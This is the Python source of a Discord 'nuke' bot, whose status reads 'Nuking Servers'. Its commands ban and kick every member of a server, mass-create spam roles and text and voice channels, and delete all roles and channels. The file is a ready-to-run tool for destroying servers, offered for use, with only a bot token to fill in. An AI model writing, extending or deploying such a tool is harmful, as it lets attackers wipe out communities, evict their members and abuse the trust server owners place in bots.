import discord
from discord.ext import commands

client = commands.Bot(command_prefix = '.')

@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.dnd, activity=discord.Game('Nuking Servers'))
    print(f'\nLogged in as {client.user.name}#{client.user.discriminator}, User ID: {client.user.id}, Version: {discord.__version__}\n')

@client.command()
async def banAll(ctx):
    await ctx.message.delete()
    await ctx.send('Banning all members!')
    print('Banning all members...')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue

@client.command()
async def kickAll(ctx):
    await ctx.message.delete()
    await ctx.send('Kicking all members!')
    print('Kicking all members...')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue

@client.command()
async def role(ctx, choice):
    if choice == 'create':
        print('Spam creating roles...')
        for i in range(1, 11):
            await ctx.guild.create_role(name=f'Spam Role {i}')
    elif choice == 'delete':
        print('Deleting all roles...')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                break
    else:
        await ctx.send('not valid option')

@client.command()
async def channel(ctx, choice):
    if choice == 'create':
        print('Spam creating channels...')
        for i in range(1, 11):
            await ctx.guild.create_text_channel(f'Spam-Text-Channel{i}')
            await ctx.guild.create_voice_channel(f'Spam-Voice-Channel{i}')
    elif choice == 'delete':
        print('Deleting all channels...')
        for channel in ctx.guild.channels:
            await channel.delete()
    else:
        await ctx.send('not valid option')

@client.command()
async def logout(ctx):
    if ctx.author.id == myID: #replace myID with your Discord user ID
        await client.logout()
    else:
        await ctx.send('you cant do that')

client.run('TOKEN') #replace TOKEN with your bot token
